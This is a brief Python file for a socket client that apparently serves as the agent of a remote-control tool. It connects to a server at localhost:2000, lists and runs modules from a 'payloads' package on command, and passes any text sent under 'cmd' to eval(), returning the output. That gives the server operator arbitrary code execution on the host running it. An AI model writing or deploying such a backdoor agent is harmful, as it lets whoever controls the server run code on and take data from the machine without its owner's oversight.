from socketHelpers.client import Client
from socketHelpers.packet import Packet

import os


import payloads.test

PAYLOADS = [payloads.test]


class Client(Client):
    def handle(self, packet):
        if packet.get_id() == "execute_list":
            self.send(Packet("execute", str([x.__name__ for x in PAYLOADS])))

        if packet.get_id() == "execute":
            data = PAYLOADS[int(packet.read())].execute()
            self.send(Packet("info", data))

        if packet.get_id() == "cmd":
            try:
                data = eval(packet.read())
            except Exception as e:
                data = "%s: %s"%(type(e), e)

            self.send(Packet("info", data))




c = Client("localhost", 2000)
c.start()
